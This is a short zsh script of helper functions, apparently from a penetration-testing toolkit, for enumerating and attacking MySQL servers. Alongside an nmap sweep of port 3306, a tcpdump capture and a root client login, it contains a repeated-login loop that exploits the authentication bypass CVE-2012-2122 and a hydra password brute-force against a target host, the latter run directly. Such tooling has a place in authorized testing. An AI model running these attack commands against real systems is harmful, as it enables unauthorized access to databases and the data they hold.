#!/usr/bin/env zsh

############################################################# 
# qq-enum-mmysql
#############################################################

qq-enum-mysql-sweep-nmap() {
    qq-vars-set-network
    print -z "sudo nmap -n -Pn -sS -p 3306 ${__NETWORK} -oA $(__netpath)/mysql-sweep"
}

qq-enum-mysql-tcpdump() {
    qq-vars-set-iface
    qq-vars-set-rhost
    print -z "sudo tcpdump -i ${__IFACE} host ${__RHOST} and tcp port 3306 -w $(__hostpath)/mysql.pcap"
}

qq-enum-mysql-client(){
  qq-vars-set-rhost
  print -z "mysql -u root -p -h ${__RHOST}"
}

qq-enum-mysql-auth-bypass() {
  qq-vars-set-rhost
  __info "CVE-2012-2122"
  print -z "for i in {1..1000}; do mysql -u root --password=bad -h ${__RHOST} 2>/dev/null; done"
}

qq-enum-mysql-hydra() {
  qq-vars-set-rhost
  local user && read "user?$fg[cyan]USER:$reset_color "
  hydra -l ${user} -P ${__PASSLIST} ${__RHOST} mysql
}

